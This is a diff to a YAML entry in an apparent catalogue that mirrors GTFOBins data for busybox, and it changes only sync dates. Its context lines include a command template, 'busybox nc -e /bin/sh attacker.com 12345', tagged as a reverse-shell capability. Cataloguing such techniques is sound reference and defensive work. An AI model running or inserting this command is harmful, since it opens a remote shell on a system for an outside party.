@@ -13,7 +13,7 @@ sources:
   upstream_url: https://gtfobins.github.io
   license: GPL-3.0
   upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
-  last_synced: '2026-11-13'
+  last_synced: '2026-11-14'
 commands:
 - template: busybox nc -e /bin/sh attacker.com 12345
 references:
@@ -56,7 +56,7 @@ source_data:
               receiver: http-client
     upstream_url: https://gtfobins.github.io/gtfobins/busybox/
     upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
-    last_synced: '2026-11-13'
+    last_synced: '2026-11-14'
 enrichment:
   capabilities:
   - value: reverse-shell
@@ -92,6 +92,6 @@ enrichment:
 _meta:
   schema_version: 1
   generated_by: loldex-projection
-  projected_at: '2026-11-13'
+  projected_at: '2026-11-14'
   source_hashes:
     GTFOBins: sha256:ac0ecfb28b3f2000fc15b3b526a32c4f9443979e191a7c5b2a99d4e26ca1816c
